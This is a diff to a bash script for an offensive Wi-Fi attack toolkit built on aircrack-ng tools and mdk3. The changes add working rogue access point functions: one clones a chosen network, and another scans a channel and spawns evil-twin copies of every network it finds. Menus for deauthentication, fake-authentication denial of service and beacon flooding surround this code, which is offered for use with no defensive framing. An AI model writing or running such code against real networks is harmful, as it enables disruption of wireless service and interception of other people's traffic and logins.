@@ -35,6 +35,7 @@ echo  '''
   AirMonitor=airmon-ng
   AirDumper=airodump-ng
   AirAttack=aireplay-ng
+  AirBase=airbase-ng
   MDK=mdk3
   Tool=xterm
   sniffer=tcpdump
@@ -117,7 +118,6 @@ done
                                                                                         then
 
                                                                                         interfaceconfcheck
-
 
 
                                                                   elif [ $get -eq 9 ];
@@ -288,7 +288,7 @@ fi
 StreetDeauth(){
 
 sudo ./maker.sh
-sudo ./attack.sh
+
 }
 
 
@@ -320,7 +320,7 @@ AuthDoSAttacks(){
 
         echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Fake Auth AP"
         echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"AP Auth (Auth with multiple fake MACs for a exclusive AP)"
-        echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"AP Auth in range (The same than option 2 but in all AP's frpm one channel o multiple channel)"
+        echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"AP Auth in range (The same than option 2 but in all AP's from one channel o multiple channel)"
         echo $purple"{"$cyan"4"$purple"}"$yellow"--"$green"AP Auth for all (The same than option 2 but for all AP's that finds youre wireless NIC in monitor mode)"
         echo $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Craft Virtual interfaces for attack..."
         echo $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Back to menu"
@@ -351,7 +351,7 @@ AuthDoSAttacks(){
                                                 elif [ $auth -eq 5 ];
                                                         then
 
-                                                        Menuoption
+                                                        ./VIRTUALinterfaces_conf.sh
                         
 
 
@@ -365,7 +365,7 @@ FakeAuthAP(){
 fakeMAC=E6:EF:59:81:6A:DD
 MonitorMode2
 echo
-echo $purple "╭─"$green"Enter MAC address target (-_-) "$purple
+echo $purple "╭─"$green"Enter MAC address dtarget (-_-) "$purple
                            read -p " ╰─$ " AP
 
 echo $purple "╭─"$green"Enter Network channel (-_-) "$purple
@@ -407,7 +407,7 @@ sudo $Tool -e $AirAttack -1 0 -a "$AP" -h "$current_mac" "$current_interface" & 
 
 done
 
-sudo $Tool -e $AirDumper --bssid $AP $wifiInterfaceMon                           
+
 }
 
 #### DOS Fake Auth to Range channel AP ####
@@ -469,13 +469,78 @@ fi
 #### Rogue1AP ####
 
 Rogue1AP(){
-        echo "in develop..."
+        
+echo $purple "╭─"$green"Enter youre interface (-_-) "$purple
+                           read -p " ╰─$ " wlanin
+
+echo "starting monitor mode on $wlanin"
+MonitorMode
+
+echo $purple "╭─"$green"Enter target channel (-_-) "$purple
+                           read -p " ╰─$ " nchan
+
+sudo $Tool -fg red  -e $AirBase -a $bssid -e $targetName -c $nchan $wifiInterfaceMon     
 }
 
 #### RangeRogueAP ####
 
 RangeRogueAP(){
-        echo "in develop..."
+
+echo "\n${red}┌─[${red}Select range channel for Targets${red}]──[${red}~${red}]─[${red}Network${red}]:"
+read -p "└─────►$(tput setaf 7) " chann
+            echo 
+            echo "scanning networks in channel $chann..."       
+            echo 
+                sudo timeout 25s $Tool -e $AirDumper -c $chann --output-format kismet --write generated $wifiInterfaceMon
+echo ""
+                echo showing networks available in channel $chann...
+echo ""
+
+ sed -i '1d' generated-01.kismet.csv
+
+echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
+echo "---------------------------------------------------------------------------------------"
+awk -F';' '{print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8
+
+echo ""
+echo "sending AP MAC addresses in channel $chann to export file..."
+sleep 3
+awk -F';' '{print "     " $4 }' generated-01.kismet.csv >> APs.txt
+sed -i '/BSSID/d' APs.txt
+sed -i 's/^[[:space:]]*//' APs.txt
+echo ""
+echo "sending AP ESSID in channel $chann to export file..."
+awk -F';' '{print "     " $3 }' generated-01.kismet.csv >> Names.txt
+echo ""
+echo "showing MACs..."
+echo ""
+cat APs.txt
+echo ""
+sed -i 's/^[[:space:]]*//' Names.txt
+echo "showing Names..."
+cat Names.txt
+echo ""
+echo "Starting RogueAP attack in all networks from channel $chann"
+
+sudo timeout 1000s $Tool -e $AirDumper -c $chann $wifiInterfaceMon &
+
+file="APs.txt"
+names="Names.txt"
+
+if [ -f "$file" ] && [ -f "$names" ]; then
+while IFS= read -r target <&3 && IFS= read -r targetName <&4; do
+
+
+if [ -n "$target" ] && [ -n "$targetName" ]; then
+
+sudo $Tool -e $AirBase -a $target -e $targetName -c $chann $wifiInterfaceMon &
+else 
+    echo "BSSID O ESSID no valid: $target, $targetName"
+fi
+done 3<"$file" 4<"$names"
+else
+echo "the file $file or $names doesnt exist"
+fi
 }
 
 #### All 2.4GHz band RogueAP attack ####
@@ -529,6 +594,7 @@ echo try again dude...
 Election
 echo ""
 fi
+
 }
 
 
@@ -564,6 +630,7 @@ echo ""
 echo "AAAAAA my eyes put glasses lmfao..."
 echo ""
 BeaconFlood
+
 fi
 }
 
@@ -857,6 +924,7 @@ echo ""
 iw list
 echo ""
 }
+
 
 #### Functions call ####
 
